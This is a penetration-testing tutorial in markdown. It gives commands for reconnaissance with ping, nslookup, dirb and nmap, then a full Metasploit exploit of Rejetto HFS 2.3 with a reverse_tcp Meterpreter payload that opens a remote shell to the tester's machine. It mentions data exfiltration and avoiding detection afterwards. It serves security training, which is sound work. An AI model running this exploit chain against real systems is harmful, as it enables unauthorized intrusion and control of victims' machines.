<h1 align="center">PENETRATION TESTING PRACTICAL EXAMPLE COMMANDS</h1>

## STEP 1 (Information Gathering)

- Information gathering, or reconnaissance, is the initial phase where you collect data about the target system to identify potential vulnerabilities.

- The ping command checks the reachability of the target IP address and measures the round-trip time for messages sent to the destination. This helps determine if the host is active.

```bash
$ ping <ip address>
```

- nslookup queries the Domain Name System (DNS) to obtain the domain name associated with the target IP address. This can reveal valuable information about the target's network.

```bash
$ nslookup <ip address>
```

- dirb is a web content scanner that brute-forces directories and files on web servers. It helps discover hidden resources that might be accessible without proper authorization.

```bash
$ dirb <ip address>
```

- dirbuster is a graphical tool similar to dirb but offers a user-friendly interface and additional features for discovering hidden directories and files on web servers.
```bash 
$ dirbuster
```

## STEP 2 (SCANNING)

- Scanning involves probing the target system to identify open ports, services, and potential vulnerabilities.

- nmap is a network scanner used to discover hosts and services on a computer network. This command performs a basic scan to identify open ports on the target system.

```bash
$ nmap <ip address>
```

```bash
$ nmap <ip address> -sV -O -p 8081
```

## STEP 3 (EXPLOITATION)

- In this scenario, we've identified that the target is running Rejetto HTTP File Server (HFS) version 2.3, which is vulnerable to remote command execution due to a flaw in its scripting commands. We'll use Metasploit to exploit this vulnerability.

- This command searches Metasploit's database for available exploits related to "rejetto." The relevant module is exploit/windows/http/rejetto_hfs_exec.

```bash
$ searchslpoit rejetto
```

- This command starts the Metasploit console, providing access to its extensive suite of exploitation tools.

```bash
$ msfconsole
```

- This command selects the Rejetto HFS exploit module for use.

```bash
$ use exploit/windows/http/rejetto_hfs_exec
```

- Set the Target's IP Address:

```bash
set RHOSTS <target_ip>
```
- Replace <target_ip> with the actual IP address of the target system.

- Specify the Target Port (if different from default):

```bash
set RPORT 80
```
- If the HFS service is running on a port other than the default HTTP port (80), specify it here.

- Configure the Payload:

```bash
set PAYLOAD windows/meterpreter/reverse_tcp
```
- This sets the payload to establish a reverse TCP connection, providing a Meterpreter shell on the target system.

- Set Local Host for the Reverse Connection:

```bash
set LHOST <your_ip>
```
- Replace <your_ip> with your machine's IP address to receive the reverse connection.

- Set Local Port for the Reverse Connection:

```bash
set LPORT 4444
```
- This sets the local port to listen for the incoming connection. Ensure this port is open and not blocked by any firewall.

- Verify the Exploit Settings:

```bash
show options
```
- Review all configured options to ensure accuracy before launching the exploit.

- Execute the Exploit:

```bash
exploit
```
- This command initiates the exploit. Upon successful execution, it establishes a Meterpreter session, granting control over the target system.


## Important Considerations:

- Legal Authorization: Ensure you have explicit permission to conduct penetration testing on the target system to comply with legal and ethical standards.

- Post-Exploitation: After gaining access, proceed with post-exploitation activities, such as privilege escalation, data exfiltration, or system analysis, based on the objectives of your engagement.

- Cleanup: Always remove any files or artifacts left on the target system during exploitation to prevent detection and maintain system integrity.

